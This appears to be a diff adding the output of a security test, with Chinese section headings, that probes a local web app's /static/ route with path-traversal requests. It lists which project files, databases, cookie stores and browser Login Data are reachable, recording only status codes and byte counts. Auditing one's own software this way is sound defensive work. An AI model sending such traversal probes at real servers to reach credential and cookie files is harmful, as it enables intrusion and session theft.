@@ -1,0 +1,22 @@
+==============================================================================
+[F] 利用链可达性：穿越 → 项目内高价值文件（仅状态/字节数，不打印内容）
+==============================================================================
+  /static/../server.py                                     -> HTTP/1.0 200 OK  Content-Length=31482  bytes_read=31482
+  /static/../db.py                                         -> HTTP/1.0 200 OK  Content-Length=51829  bytes_read=51829
+  /static/../../main.py                                    -> HTTP/1.0 200 OK  Content-Length=9988  bytes_read=9988
+  /static/../../viewer/app.db                              -> HTTP/1.0 200 OK  Content-Length=917504  bytes_read=130560
+  /static/../../viewer/app.db.bak-20260922-230629          -> HTTP/1.0 200 OK  Content-Length=933888  bytes_read=65536
+  /static/../../tools/_cookies_latest.json                 -> HTTP/1.0 200 OK  Content-Length=7554  bytes_read=7554
+  /static/../../tools/_user_tgbuser_only.json              -> HTTP/1.0 200 OK  Content-Length=28  bytes_read=28
+  /static/../../tools/cookies.prev-anon.json               -> HTTP/1.0 200 OK  Content-Length=5701  bytes_read=5701
+  /static/../../.browser-profile/Default/Network/Cookies   -> HTTP/1.0 200 OK  Content-Length=28672  bytes_read=28672
+  /static/../../.browser-profile/Default/Login Data        -> HTTP/1.0 400 Bad request syntax ('GET /static/../../.browser-profile/Default/Login Data HTTP/1.1')  Content-Length=417  bytes_read=417
+  /static/../../../../Windows/win.ini                      -> HTTP/1.0 404 Not Found  Content-Length=330  bytes_read=330
+
+==============================================================================
+[G] 健壮性对照：目录 / 特殊路径（read_bytes 无兜底 → 连接中断）
+==============================================================================
+  /static/..             ->   bytes_read=0
+  /static/.              ->   bytes_read=0
+  /static/../static      ->   bytes_read=0
+  /static/               ->   bytes_read=0
